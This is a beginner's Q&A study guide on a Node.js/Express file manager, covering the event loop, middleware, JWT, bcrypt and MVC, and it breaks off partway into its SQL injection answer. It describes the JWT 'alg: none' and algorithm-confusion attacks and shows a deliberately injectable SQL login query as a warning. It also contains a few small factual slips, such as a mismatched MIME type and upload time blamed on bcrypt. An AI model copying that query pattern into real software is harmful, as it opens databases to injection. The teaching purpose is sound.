# Mentor Knowledge Check — Full Beginner-to-Pro Q&A Guide
## Personal File Manager: Express + SQLite + JWT + Multer + Jest

> This document is written assuming you just started Node.js today.
> Every answer is explained from scratch, with real examples from your code.
> Read every answer carefully and understand the "WHY" — that is what your mentor will test.

---

## COVERAGE MAP (What your mentor asked for → where it is answered)

| Mentor Requirement | Questions & Sections |
|---|---|
| **How Node works?** | **Q1, Q2, Q4, Q44** (V8, Libuv, Event Loop 6 phases, Microtasks vs Macrotasks, Libuv Thread Pool, Streams vs Buffers) |
| **Journey of a request till it reached API and returns a response** | **Q7, Q8, Q35** (Socket -> OS -> V8 -> Router -> Rate Limiter -> Auth Guard -> Multer -> Controller -> SQLite WAL -> HTTP 201 Response) |
| **MVC structure of the project** | **Q10, Q11, Q39** (Model: User/File, View: HTML/CSS/JS, Controller: Auth/File, Route separation) |
| **Authentication (JWT) based** | **Q12, Q14, Q23, Q47** (Header.Payload.Signature, HS256 algorithm pinning, Bearer token, httpOnly cookies vs localStorage) |
| **Basic validation (by using middleware)** | **Q39, Q40** (Custom middleware with `(req, res, next)`, input sanitization, `:id` param validation, fail-fast boundary) |
| **Query params used like GET, PUT, etc.** | **Q31, Q41** (`req.query` vs `req.params` vs `req.body`, search, MIME filter, pagination offset/limit, sorting whitelist, query params on PUT/DELETE) |
| **Error handling** | **Q9, Q37, Q38, Q46** (6-layer error defense, 4-argument central handler, Express 5 automatic promise rejection catching, orphan file cleanup) |
| **File upload saved to local disk** | **Q22, Q24, Q25** (Multer `diskStorage`, UUID filenames, UTF-8 filename encoding, orphan file prevention) |
| **Metadata stored in database table** | **Q19, Q20, Q21, Q45** (SQLite, `better-sqlite3`, WAL concurrency, prepared statements, indexes, COALESCE, transactions) |
| **View, update & delete stored files** | **Q31, Q32, Q35** (RESTful CRUD endpoints, IDOR prevention via `uploaded_by`, path traversal defense) |
| **Write test cases using JEST** | **Q26, Q27, Q42** (Jest + Supertest, 19 auth tests, multipart file upload testing with `.attach()`, `afterAll` cleanup) |
| **Good to have: Run AWS services locally (LocalStack / S3)** | **Q36, Q43** (Docker LocalStack setup, AWS SDK v3 `@aws-sdk/client-s3`, `memoryStorage`, PutObject, Presigned URLs, DeleteObject) |
| **Logging** | **Q34** (Log levels, console error logging, production logging with Morgan and Winston) |
| **Edge cases & Security defense** | **Q13, Q15, Q16, Q17, Q18, Q28, Q29, Q30, Q47, Q48** (SQL injection, IDOR, Path Traversal, 72-byte bcrypt limit, Magic Bytes, 10 rapid-fire viva questions) |

---

## PART 1: Node.js Fundamentals

---

### Q1: What is Node.js? How is it different from JavaScript in the browser?

**Answer:**

Imagine JavaScript as a language — like English. For years, English (JavaScript) could only be spoken inside a specific building called the **Browser** (Chrome, Firefox, Edge). Outside that building, it meant nothing.

**Node.js** is like building a new city where English can now be spoken outside the browser. It is a **runtime environment** — an environment that lets JavaScript run on your computer's operating system, outside any browser.

**Built on V8:**
Node.js uses Google's V8 engine — the same JavaScript engine inside Chrome — to convert your JavaScript code into machine code that your computer's processor can execute.

**What you CAN do in Node.js that you CANNOT do in a browser:**

| Capability | Browser JS | Node.js |
|---|---|---|
| Access files on disk | ❌ No (security restriction) | ✅ Yes (`fs` module) |
| Create a web server | ❌ No | ✅ Yes (`http` / `express`) |
| Read environment variables | ❌ No | ✅ Yes (`process.env`) |
| Connect to databases | ❌ No | ✅ Yes (SQLite, MongoDB, etc.) |
| Access `window`, `document`, DOM | ✅ Yes | ❌ No (no browser!) |
| Run on a server/cloud | ❌ No | ✅ Yes |

**In our project:** Node.js powers the entire backend — it receives HTTP requests from the browser, handles authentication, saves files to disk, queries SQLite, and sends JSON responses back.

**How to verify Node is installed:**
```bash
node --version    # → v22.15.0
npm --version     # → 10.x.x
```

---

### Q2: What is the Event Loop? How does Node.js handle multiple requests if it's single-threaded?

**Answer:**

This is one of the most important concepts in Node.js. Let's build it up from basics.

**What is single-threaded?**
A "thread" is like a worker in a factory. Most traditional web servers (like Java's Apache Tomcat) have many workers — if 100 users send requests at the same time, 100 workers handle them simultaneously.

Node.js has **only ONE worker** (one thread). That sounds like a problem — how can it handle many users?

The answer is: **Node doesn't wait around doing nothing while I/O work is happening.**

**What is I/O?**
I/O = Input/Output. Any operation that involves reading from or writing to something external:
- Reading a file from disk
- Writing to a database
- Making a network API call
- Receiving an HTTP request

These operations take TIME — milliseconds to seconds. Traditional servers would have the worker sit and stare at the wall waiting. Node's one worker would be blocked and couldn't handle anything else.

**Node's solution: Non-blocking I/O + Event Loop**

When Node.js needs to do I/O, it says to the Operating System:
> "Hey OS, go read this file for me. When you're done, call me back. I'm going to go handle other requests in the meantime."

This is **non-blocking** — Node hands off the work and immediately goes back to accepting and processing other requests. When the I/O finishes, the OS notifies Node via a **callback**, and Node's Event Loop picks it up and runs it.

**The Event Loop — step by step:**

```
                    ┌───────────────────────────────────┐
                    │         Node.js Process            │
                    │                                   │
  Incoming          │   ┌─────────────┐                │
  Requests  ──────► │   │  Call Stack │                │
                    │   │  (your JS)  │                │
                    │   └──────┬──────┘                │
                    │          │  if I/O needed         │
                    │          ▼                        │
                    │   ┌─────────────────┐            │
                    │   │  libuv thread   │            │
                    │   │  pool / OS      │  ← actual  │
                    │   │  (file read,    │    work     │
                    │   │  DB query,etc.) │  happens   │
                    │   └────────┬────────┘  here      │
                    │            │  when done           │
                    │            ▼                      │
                    │   ┌─────────────────┐            │
                    │   │   Event Queue   │            │
                    │   │  (callbacks     │            │
                    │   │  waiting)       │            │
                    │   └────────┬────────┘            │
                    │            │  Event Loop          │
                    │            │  picks up callback   │
                    │            ▼                      │
                    │   ┌─────────────┐                │
                    │   │  Call Stack │  ← runs the    │
                    │   │  again      │  callback       │
                    │   └─────────────┘                │
                    └───────────────────────────────────┘
```

**Real example with our file upload:**

1. User 1 uploads a 5MB PDF → Node asks the OS to write the file to disk
2. While that write is happening (say 50ms), User 2 sends a login request
3. Node's one thread processes User 2's login IMMEDIATELY — doesn't wait for User 1's file write
4. File write finishes → OS puts the callback in the Event Queue
5. Event Loop picks it up → Node responds to User 1 with "upload successful"

**The Event Loop phases (in order every iteration):**

1. **Timers** — Runs any `setTimeout()` or `setInterval()` callbacks whose time has arrived
2. **Pending I/O Callbacks** — Runs I/O callbacks deferred from last iteration
3. **Idle/Prepare** — Internal use only (you never interact with this)
4. **Poll** — Retrieves new I/O events; Node waits here if nothing else to do
5. **Check** — Runs `setImmediate()` callbacks
6. **Close Callbacks** — Runs `socket.on('close', ...)` and similar cleanup callbacks

After completing all phases, the loop starts over — it loops continuously as long as there are pending tasks.

**The key takeaway:**
Node.js is fast not because of multiple threads, but because it **never wastes time waiting**. The one thread is always busy with real computation, delegating all waiting to the OS.

---

### Q3: What is `require.main === module`? Where did you use it and why?

**Answer:**

**First, understand what `require` and `module` are:**

Every JavaScript file in Node.js is treated as a **module** — an isolated unit of code. Each file gets its own `module` object automatically.

When you run a file directly like `node server.js`, Node sets `require.main` to equal that file's `module` object — meaning this file was the entry point that started everything.

When another file imports it like `const app = require('./server')`, Node does NOT set `require.main` to `server`'s module — because `server.js` was not the starting point in that run.

**So `require.main === module` is:**
- `true` → "I am the file that was run directly with node"
- `false` → "I was imported by some other file"

**Where we used it in `server.js` (line 62):**

```javascript
if (require.main === module) {
  app.listen(PORT, () => console.log(`Application running on http://localhost:${PORT}`));
}
module.exports = app;
```

**Why this matters — The Jest problem:**

When you run `npm test`, Jest imports `server.js` to get the Express `app`:
```javascript
// auth.test.js line 3
const app = require('../server');
```

**WITHOUT the guard:**
- Requiring `server.js` would immediately run `app.listen(5000)`
- A real network server starts on port 5000
- After all 19 tests finish in 1.3 seconds, Jest tries to exit
- Node: "I cannot exit — there's a live server listening on port 5000!"
- **Jest freezes and never returns your terminal prompt**
- Also — if your server is already running in another terminal, you'd get `EADDRINUSE: address already in use :::5000`

**WITH the guard:**
- Jest imports `server.js` → `require.main === module` is `false` → `app.listen()` is SKIPPED
- Jest gets the `app` object, runs tests in memory, finishes, exits cleanly
- When you run `npm start` or `npm run dev` → `require.main === module` is `true` → server starts normally

---

### Q4: What is the difference between synchronous and asynchronous code? What is `async/await`?

**Answer:**

**Synchronous code** = code that executes line by line, waiting for each line to finish before moving to the next.

```javascript
// Synchronous — blocks everything
const data = fs.readFileSync('./bigfile.txt'); // waits here until file is read
console.log('File read done'); // only runs after the above finishes
console.log('Processing...'); // only runs after that
```

If `bigfile.txt` takes 500ms to read, your server is FROZEN for 500ms — no other request can be handled.

**Asynchronous code** = you START an operation, provide a callback or Promise, and move on. When the operation finishes, your code continues.

**Three generations of async code:**

**Generation 1: Callbacks (oldest)**
```javascript
fs.readFile('./bigfile.txt', (err, data) => {
  // This runs when file is done reading
  if (err) throw err;
  console.log('File read done');
});
console.log('This runs IMMEDIATELY while file is being read');
```
Problem: When you nest callbacks inside callbacks inside callbacks, it becomes "callback hell" — extremely hard to read.

**Generation 2: Promises**
```javascript
fs.promises.readFile('./bigfile.txt')
  .then(data => console.log('File read done'))
  .catch(err => console.error('Error:', err));
console.log('This still runs immediately');
```
Better, but chaining `.then().then().then()` gets messy.

**Generation 3: async/await (what we use)**
```javascript
const readFile = async () => {
  try {
    const data = await fs.promises.readFile('./bigfile.txt');
    console.log('File read done');
  } catch (err) {
    console.error('Error:', err);
  }
};
```
`async/await` is just **syntactic sugar** over Promises — it makes async code look synchronous, but it's not. The Event Loop still keeps working during the `await`.

**In our `fileController.js`:**
```javascript
const uploadFile = async (req, res) => {
  // ...
  await fs.promises.unlink(req.file.path).catch(() => {});
  // ↑ awaits the disk deletion. Node is NOT blocked —
  // other requests are still served while this waits.
};
```

**Rule:** Any function that uses `await` must be declared `async`. Async functions always return a Promise.

---

### Q5: What is `process.env`? How does `dotenv` work? Why not hardcode values?

**Answer:**

**`process` is Node.js's global object** — it represents the currently running Node process (like `window` is the global object in a browser).

**`process.env`** is an object containing all **environment variables** — name-value pairs that the operating system makes available to processes.

Think of environment variables like settings or secrets that exist outside your code.

**Without dotenv — Manual approach:**
```bash
# In Windows PowerShell, set before running:
$env:JWT_SECRET="mySecret123"
$env:PORT="5000"
node server.js
```
Your code then reads: `process.env.JWT_SECRET` → `"mySecret123"`

**With dotenv — The `.env` file approach:**
Instead of setting variables manually every time, you put them all in a `.env` file:

```env
# .env
PORT=5000
DB_PATH=./data/app.db
JWT_SECRET=9ee178d89d1bccb8e0eeabe...
JWT_EXPIRES_IN=1d
MAX_FILE_SIZE_MB=5
```

Then in `server.js` line 1:
```javascript
require('dotenv').config();
```

This call reads the `.env` file and loads every line into `process.env`. After this line, anywhere in your app:
```javascript
process.env.JWT_SECRET     // → "9ee178d89d1bccb8e0eeabe..."
process.env.PORT           // → "5000"
process.env.MAX_FILE_SIZE_MB // → "5"
```

**CRITICAL: Why NEVER hardcode secrets in source code:**

**Bad (never do this):**
```javascript
const JWT_SECRET = "myHardcodedSecret123"; // ← DANGEROUS
```

Reasons:
1. **GitHub exposure:** When you push to GitHub, this secret is visible to the entire internet forever — even if you delete it later, git history preserves it
2. **Different environments:** Development, staging, and production need different database credentials — hardcoding makes this impossible
3. **Team security:** Every developer doesn't need to know every secret
4. **Rotation:** You can't change a hardcoded value without redeploying code

**The .env file is in `.gitignore`:**
```
# .gitignore
node_modules/
.env         ← never committed to git
data/
uploads/*
```

`.env.example` IS committed — it shows teammates what variables are needed, but with fake placeholder values.

---

## PART 2: Express Framework

---

### Q6: What is Express? What problem does it solve over raw Node.js?

**Answer:**

**Without Express — Raw Node.js HTTP server:**
```javascript
const http = require('http');

const server = http.createServer((req, res) => {
  if (req.method === 'GET' && req.url === '/api/files') {
    // manually parse headers
    // manually check authorization
    // manually read body
    // manually query database
    // manually set Content-Type header
    // manually write response
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ files: [] }));
  } else if (req.method === 'POST' && req.url === '/api/files') {
    // ... even more manual work
  }
  // ... every route manually
});
server.listen(5000);
```

This becomes a nightmare with many routes. You'd manually parse every request body, every URL, every query string.

**With Express:**
Express is a **lightweight web framework** that wraps Node's raw HTTP functionality and provides:
- **Routing:** `app.get('/api/files', handler)` — clean route definitions
- **Middleware system:** Plug in functions that process every request automatically
- **Request parsing:** `express.json()` automatically parses JSON body
- **Response helpers:** `res.json()`, `res.sendFile()`, `res.download()`, `res.redirect()`
- **Router:** Organize routes in separate files

**Express is intentionally minimal** — it doesn't decide your database, your template engine, or your project structure. You choose everything. That's why we added:
- `multer` for file uploads
- `bcryptjs` for password hashing
- `jsonwebtoken` for JWT
- `better-sqlite3` for the database

---

### Q7: What is middleware? Explain with examples from your project.

**Answer:**

**Simple analogy:** Think of an airport security checkpoint. Every passenger (request) must go through:
1. Passport check (authentication)
2. Baggage X-ray (body parsing)
3. Metal detector (validation)
4. ... only then reach the departure gate (route handler)

Each checkpoint is a **middleware function**. They run in order, and each one can:
- Let you through → calls `next()`
- Block you → sends a response and stops the chain
- Modify your belongings → modifies `req` or `res`

**Middleware signature:**
```javascript
function myMiddleware(req, res, next) {
  // req = the incoming request object
  // res = the outgoing response object
  // next = function to call to pass to the next middleware
  
  // Do something...
  next(); // → pass to next middleware/route
  // OR
  res.status(401).json({ message: 'Not allowed' }); // → stop here
}
```

**Middleware chain in our project (in order):**

```
Incoming HTTP Request
         ↓
1. express.static()     ← serves CSS/JS files directly
         ↓ (if not a static file, calls next())
2. express.json()       ← parses JSON request bodies into req.body
         ↓ (always calls next())
3. viewRoutes           ← if URL is /login /register /dashboard, serves HTML
         ↓ (if no view route matched, calls next())
4. /api/auth routes     ← handles /api/auth/register and /api/auth/login
         ↓
5. /api/files routes    ← for all /api/files/* requests:
         ↓
   a. authMiddleware    ← checks JWT token
         ↓ (if valid, sets req.user and calls next())
   b. multer middleware ← parses file upload (only on POST/PUT)
         ↓ (saves file to disk, sets req.file, calls next())
   c. Route controller  ← your business logic runs here
         ↓
6. Central Error Handler ← catches any errors thrown above
```

**Specific middleware in our codebase:**

**`express.json()` (server.js line 26):**
```javascript
app.use(express.json());
```
When a request has `Content-Type: application/json`, this reads the raw body bytes and parses them into a JavaScript object stored in `req.body`. Without this, `req.body` would be `undefined`.

**`authMiddleware` (middleware/authMiddleware.js):**
```javascript
const authMiddleware = (req, res, next) => {
  const header = req.headers.authorization; // "Bearer eyJhbGci..."
  if (!header || !header.startsWith('Bearer ')) {
    return res.status(401).json({ message: 'Authentication required' });
    // ↑ stops here, next() is NEVER called
  }
  const token = header.slice(7).trim(); // "eyJhbGci..."
  const decoded = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
  req.user = { id: decoded.id }; // ← adds user data to request
  next(); // ← passes to the actual route handler
};
```

**Error middleware (server.js — 4 parameters):**
```javascript
app.use((err, req, res, next) => {
  // ↑ 4 parameters = this is an error handler
  // Express only calls this when next(err) or throw happens
});
```

**Key rule:** Middleware order matters enormously. `app.use(express.json())` must come BEFORE any routes that need `req.body`. `authMiddleware` must come BEFORE Multer in file routes.

---

### Q8: Explain the full journey of a request from browser to response.

**Answer:**

Let's trace the most complex request in our system: **uploading a file** (`POST /api/files`).

**Step 1: User action in the browser**
```
User fills in the upload form on dashboard.html
Clicks "Upload File"
```

**Step 2: dashboard.js creates the request**
```javascript
const formData = new FormData();
formData.append('file', selectedFile);    // the actual binary file
formData.append('name', 'My Invoice');    // optional display name

fetch('/api/files', {
  method: 'POST',
  headers: { Authorization: 'Bearer eyJhbGci...' }, // JWT token
  body: formData   // browser sets Content-Type: multipart/form-data automatically
});
```

**Step 3: HTTP packet travels over TCP/IP**
```
Browser opens TCP connection to localhost:5000
Sends raw HTTP bytes:

POST /api/files HTTP/1.1
Host: localhost:5000
Authorization: Bearer eyJhbGci...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
Content-Length: 52483

[binary file data here]
```

**Step 4: Node.js receives the connection**
```
Node's Event Loop detects incoming data on the socket
Passes it to Express's HTTP parser
Express assembles the raw bytes into a req object
```

**Step 5: Express middleware chain begins**

```
express.static()   → not a file from /public → calls next()
express.json()     → Content-Type is multipart/form-data, not JSON → calls next()
viewRoutes         → /api/files doesn't match /login etc → calls next()
fileRoutes         → /api/files MATCHES! → enters fileRoutes.js
```

**Step 6: authMiddleware runs**
```javascript
// reads: "Bearer eyJhbGci..."
// strips "Bearer " → token = "eyJhbGci..."
// jwt.verify(token, JWT_SECRET) → { id: 1, iat: ..., exp: ... }
// sets req.user = { id: 1 }
// calls next()
```

**Step 7: Multer middleware runs**
```javascript
// Sees multipart/form-data → starts parsing
// Reads MIME type from Content-Type header: "image/pdf"
// fileFilter: checks ALLOWED_TYPES → "application/pdf" → allowed ✅
// Generates filename: "3f8a1c2d-4e5b-6f7a-8b9c-0d1e2f3a4b5c.pdf"
// Streams binary data to disk: uploads/3f8a1c2d....pdf
// Sets req.file = { filename: "3f8a1c2d....pdf", path: "...", size: 52483, ... }
// Reads text field 'name': "My Invoice" → sets req.body.name = "My Invoice"
// calls next()
```

**Step 8: uploadFile controller runs**
```javascript
// req.file is set → file exists ✅
// rawOriginalName = fixFilenameEncoding(req.file.originalname)
//   → "Invoice_Q4.pdf"
// displayName = req.body.name → "My Invoice"

// File.create({ original_name, display_name, stored_name, mime_type, size, path, uploaded_by })
//   → SQL: INSERT INTO files (original_name, display_name, stored_name, ...) VALUES (?, ?, ?, ...)
//   → SQLite writes the row
//   → Returns the new row: { id: 7, original_name: "Invoice_Q4.pdf", ... }

// toPublic(saved) strips internal fields
// res.status(201).json({ id: 7, original_name: "Invoice_Q4.pdf", display_name: "My Invoice", ... })
```

**Step 9: Response travels back**
```
Express serializes the object to JSON string
Sets headers: HTTP/1.1 201 Created
              Content-Type: application/json
              Content-Length: 148

Sends over TCP back to browser
```

**Step 10: Browser receives response**
```javascript
// fetch() promise resolves
const data = await res.json();
// data = { id: 7, original_name: "Invoice_Q4.pdf", display_name: "My Invoice", ... }
// dashboard.js adds a new row to the file table on screen
```

**Total time:** ~100-200ms (mostly bcrypt hashing; file I/O itself is fast for small files)

---

### Q9: What is Express error handling? What makes the 4-parameter error handler special?

**Answer:**

**Normal middleware vs Error middleware:**

Normal middleware has 3 parameters:
```javascript
app.use((req, res, next) => { ... });
```

Error middleware has 4 parameters — the first one is the error:
```javascript
app.use((err, req, res, next) => { ... });
```

Express identifies error middleware by the **number of parameters** — specifically, 4 means "this is an error handler." If you accidentally write only 3 parameters, Express treats it as a normal middleware and your errors won't reach it.

**How errors flow to the central handler:**

**Method 1: throw inside async function**
```javascript
const uploadFile = async (req, res) => {
  const saved = File.create({...});
  // If File.create() throws → Express catches it → sends to error middleware
};
```
In Express 5 (which we use), async errors are automatically forwarded to the error handler. In Express 4, you'd need to `try/catch` and `next(err)` manually.

**Method 2: next(err)**
```javascript
app.use((req, res, next) => {
  try {
    doSomething();
  } catch (err) {
    next(err); // manually sends error to error middleware
  }
});
```

**Method 3: Multer calling next(err)**
When Multer encounters a problem (file too large, wrong type), it internally calls `next(err)` with a `MulterError` object. This skips all remaining normal middleware and goes straight to our error handler.

**Our central error handler (server.js):**
```javascript
app.use((err, req, res, next) => {
  
  // CASE 1: Multer-specific errors
  if (err instanceof multer.MulterError) {
    const tooLarge = err.code === 'LIMIT_FILE_SIZE';
    return res
      .status(tooLarge ? 413 : 400)
      .json({
        message: tooLarge
          ? 'File is too large'
          : `Upload error: ${err.message}`
      });
  }

  // CASE 2: All other errors
  const status = err.status || 500;
  if (status >= 500) console.error(err); // log full trace for developers
  res.status(status).json({
    message: status >= 500
      ? 'Server error'  // hide internal details from users
      : err.message     // safe to show for 4xx errors
  });
});
```

**Why we hide details for 500 errors:**
If we sent the actual error message for a database crash, it might contain:
- File system paths: `Error reading /home/server/data/app.db`
- Database structure information
- Internal implementation details

Attackers use this to map your server's internals. We log the full error to the server console (where only developers can see it) but tell the client only: `"Server error"`.

---

## PART 3: Architecture (MVC)

---

### Q10: What is MVC? Explain it like I'm building a restaurant.

**Answer:**

**MVC = Model, View, Controller**

Imagine you're building a restaurant ordering system:

**Model = The Kitchen and Recipe Book**
- Knows how to store and retrieve data (ingredients, recipes)
- Does the actual cooking (database queries)
- Has no idea what the customer looks like or what screen they're on
- Just takes orders and returns dishes

In code: `models/user.js`, `models/file.js`
```javascript
// Model only knows about data. No req, no res, no Express.
const User = {
  create(username, passwordHash) {
    return insertUser.run(username, passwordHash);
  },
  findByUsername(username) {
    return selectByUsername.get(username);
  }
};
```

**View = The Menu and the Dining Room**
- What the customer sees and interacts with
- Pretty presentation of data
- Has no idea how the food is made

In code: `views/login.html`, `views/dashboard.html`, `public/css/*.css`, `public/js/*.js`

**Controller = The Waiter**
- Takes the customer's order (HTTP request)
- Decides what the kitchen needs to do
- Tells the kitchen (Model) what data to fetch or save
- Brings the food (data) back and presents it properly to the customer (response)
- Knows both the dining room AND the kitchen

In code: `controllers/authController.js`, `controllers/fileController.js`
```javascript
// Controller coordinates: req → model → response
const register = async (req, res) => {
  const { username, password } = req.body;    // from the customer (View)
  const hash = await bcrypt.hash(password);   // process
  const user = User.create(username, hash);   // tell the kitchen (Model)
  res.status(201).json({ token, user });      // serve the dish (response)
};
```

**Why MVC matters:**
- **Model changes** (switch from SQLite to PostgreSQL): Only `models/` files change. Controllers and Views untouched.
- **View changes** (redesign the dashboard): Only `views/` files change. Controllers and Models untouched.
- **Business logic changes**: Only `controllers/` files change.
- **Testability**: You can test Models independently without running a web server. You can test Controllers without a real database.

---

### Q11: Why did you use dedicated HTML pages instead of a React Single-Page Application?

**Answer:**

**What is a Single-Page Application (SPA)?**
In a React SPA, the browser loads ONE HTML file once. Then React dynamically rewrites the DOM (page content) in JavaScript — simulating navigation without actually loading new pages.

**What we built instead — Multi-Page Application (MPA):**
- `/login` → server sends `login.html` → browser loads it completely
- `/dashboard` → server sends `dashboard.html` → browser loads it completely
- These are genuinely separate pages

**Why we chose MPA for this project:**

| Concern | React SPA | Our MPA |
|---|---|---|
| **Dependencies** | 300+ MB `node_modules/client`, React, Babel, Vite | Zero — just HTML/CSS/JS |
| **Build step** | Need `npm run build` before every deploy | None — no compilation |
| **Page isolation** | All pages share one JavaScript context | Each page has its own independent context |
| **Browser history** | Need React Router for back/forward | Native browser history works automatically |
| **Initial load** | Loads the entire React app on first visit | Loads only what that specific page needs |
| **Complexity** | State management, component lifecycle | Plain JavaScript functions |

**What we gave up with MPA:**
- Instant page transitions (React has very smooth client-side navigation)
- Shared component state between pages
- Rich animated transitions

**For a secure file manager (our use case):**
MPA is better because:
1. Each page loads in isolation — a bug in `login.js` cannot affect `dashboard.js`
2. No complex authentication state to manage in React components
3. Browser's natural security model — each page load is a fresh start
4. Much simpler codebase — anyone can read and understand it immediately

---

## PART 4: Authentication & Security

---

### Q12: What is JWT? Explain the structure, creation, and verification from scratch.

**Answer:**

**JWT = JSON Web Token**

**The problem JWT solves:**
HTTP is **stateless** — every request is completely independent. The server doesn't remember you between requests. So how does the server know, on request #2, that you successfully logged in during request #1?

**Old solution: Server-side sessions**
Server creates a session, stores it in memory/database, gives you a Session ID in a cookie. Every request, server looks up that Session ID. Problems: requires server-side storage, doesn't scale across multiple servers.

**JWT solution: Self-contained tokens**
Server creates a token that contains your identity information, signs it cryptographically, and sends it to you. On every subsequent request, you send the token back. The server verifies the cryptographic signature — no database lookup needed.

**JWT Structure: 3 parts separated by dots**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjE3MDAwODY0MDB9.X9bJMhNa_4F9nkmGxFsP8HqnWe3tJvFm_9ioqAUNqpE

Part 1: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
         ↓ (base64 decoded)
         { "alg": "HS256", "typ": "JWT" }
         HEADER — describes how the token is signed

Part 2: eyJpZCI6MSwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjE3MDAwODY0MDB9
         ↓ (base64 decoded)
         { "id": 1, "iat": 1700000000, "exp": 1700086400 }
         PAYLOAD — the actual data ("claims")

Part 3: X9bJMhNa_4F9nkmGxFsP8HqnWe3tJvFm_9ioqAUNqpE
         SIGNATURE — cryptographic proof of authenticity
```

**How the signature is created:**
```
Signature = HMACSHA256(
  base64(Header) + "." + base64(Payload),
  JWT_SECRET          ← your secret key from .env
)
```

The signature is a mathematical hash that ONLY someone who knows `JWT_SECRET` can produce and verify.

**How it works in our project:**

**Step 1: Login → Token Creation (authController.js)**
```javascript
const generateToken = (userId) =>
  jwt.sign(
    { id: userId },                    // payload: only the user ID
    process.env.JWT_SECRET,            // our secret key
    { expiresIn: process.env.JWT_EXPIRES_IN || '1d' }  // expires in 1 day
  );

// On successful login:
res.json({
  token: generateToken(user.id),  // e.g., "eyJhbGci...X9bJ"
  user: { id: user.id, username: user.username }
});
```

**Step 2: Client stores the token**
```javascript
// dashboard.js / login.js
localStorage.setItem('token', data.token);
```

**Step 3: Client sends token on every request**
```javascript
fetch('/api/files', {
  headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
});
```

**Step 4: Server verifies token (authMiddleware.js)**
```javascript
const decoded = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
// jwt.verify:
//   1. Decodes the header → checks algorithm is HS256
//   2. Decodes the payload → checks expiration time
//   3. Recomputes the signature using JWT_SECRET
//   4. Compares with the signature in the token
//   5. If they match → token is authentic → returns decoded payload
//   6. If they don't match → throws JsonWebTokenError → 401
req.user = { id: decoded.id };  // id=1
```

**Why is JWT secure?**
- An attacker can READ the payload (it's just base64 — not encrypted) → so never put passwords in JWT
- An attacker CANNOT modify the payload → changing one character invalidates the signature
- An attacker CANNOT forge a new token → they don't know `JWT_SECRET`
- Tokens expire → even stolen tokens eventually become useless

---

### Q13: What is bcrypt? Why 10 salt rounds? Why cap at 72 characters?

**Answer:**

**The problem with storing plain passwords:**
If your database is hacked and you stored passwords as plain text (`"Password123"`), every user's account on every website where they use the same password is now compromised. This happened to Adobe (153 million accounts exposed in 2013).

**What is a hash?**
A hash is a one-way mathematical function. You put text in, get a fixed-length string out. You CANNOT reverse it.
```
"Password123" → sha256 → "ef92b778bafe771207..."
```

**Problem with simple hashes (SHA256, MD5):**
- They're extremely fast — a modern GPU can compute **billions** per second
- Attackers precompute hashes for millions of common passwords → "rainbow tables"
- If your hash is in the table, password found instantly

**What bcrypt does differently:**
1. **Intentionally slow:** bcrypt is designed to be computationally expensive. With 10 rounds, it takes ~100ms per hash on modern hardware. At 100ms, an attacker can try only 10 passwords/second (instead of billions).
2. **Random salt:** Every hash gets a random 22-character salt generated automatically. The salt is stored inside the hash string itself.
3. **Same password, different hash every time:**
   ```
   bcrypt("Password123") → "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
   bcrypt("Password123") → "$2a$10$XKE2LCzTQWJoZP8F.lOcmuZXHE0jHJknuXzJCxOQGbJGqMi2KbzfG"
   ```
   Different every time! So rainbow tables are useless.

**Salt rounds explained:**
- `saltRounds = 10` means bcrypt runs `2^10 = 1024` internal iterations
- Increasing by 1 doubles the computation time
- 10 → ~100ms (good for user experience, slow for attackers)
- 12 → ~400ms (more secure but users notice the delay)

**The 72 character limit:**
bcrypt was designed in 1999 by Niels Provos and David Mazières. Its internal implementation uses only the first **72 bytes** of the input password. Characters beyond position 72 are **silently ignored**.

This means: `"password_exactly_72_characters_long_ABCDEFGHIJKLMNOPQ"` and `"password_exactly_72_characters_long_ABCDEFGHIJKLMNOPQsomeextrastuffhere"` would produce the SAME hash — the extra characters are ignored.

We cap at 72 in `authController.js`:
```javascript
if (password.length < 6 || password.length > 72) {
  return 'Password must be 6-72 characters';
}
```
This prevents users from believing their 100-character password is fully protecting them when bcrypt only uses the first 72.

**How password verification works (login):**
```javascript
// user.password_hash = "$2a$10$N9qo8uLOickgx2ZMRZoMye..."
// The hash contains the salt inside it!

const passwordOk = user
  ? await bcrypt.compare(password, user.password_hash)
  //  ↑ bcrypt extracts the salt from the hash,
  //  re-hashes the input password with that same salt,
  //  and compares the result
  : false;
```

---

### Q14: What is algorithm pinning? What is the "alg: none" attack?

**Answer:**

**JWT algorithm pinning** means explicitly telling the JWT library which signing algorithm to trust.

In `authMiddleware.js`:
```javascript
const decoded = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
//                                                           ↑ PINNED to HS256
```

**Without this — the "alg: none" attack:**

JWT supports many algorithms: `HS256`, `HS512`, `RS256`, `ES256`, and also `none` (no signature at all).

Here's the attack:
1. Attacker has a valid JWT: `header.payload.signature`
2. Attacker creates a new JWT with header `{ "alg": "none" }` and payload `{ "id": 999 }` (admin user)
3. With `alg: none`, there's no signature — the token looks like: `eyJ...header.eyJ...payload.` (empty signature)
4. Vulnerable JWT library: "The header says no algorithm. So I'll verify without checking the signature. Token accepted!"
5. **Attacker now has admin access**

**With `{ algorithms: ['HS256'] }` pinning:**
- Library checks the token's header
- If header says `"alg": "none"` or `"alg": "RS256"` → not in our allowed list → thrown as error → 401 Unauthorized
- Only tokens signed with HS256 using our `JWT_SECRET` are accepted

**Algorithm confusion attack (HS256 vs RS256):**
Another variant: some systems accept both HS256 (symmetric: same key to sign and verify) and RS256 (asymmetric: private key to sign, public key to verify). An attacker could take the PUBLIC key (which is by definition public!) and sign a forged token with HS256, then submit it. A naive server verifying with "whatever algorithm the token says" would use the public key as the HS256 secret — and it would match! Algorithm pinning prevents this too.

---

### Q15: What is SQL Injection? Show exactly how your prepared statements prevent it.

**Answer:**

**SQL Injection — The Attack:**

Imagine a login check written carelessly:
```javascript
// DANGEROUS — NEVER DO THIS
const user = db.exec(
  `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`
);
```

If a user enters:
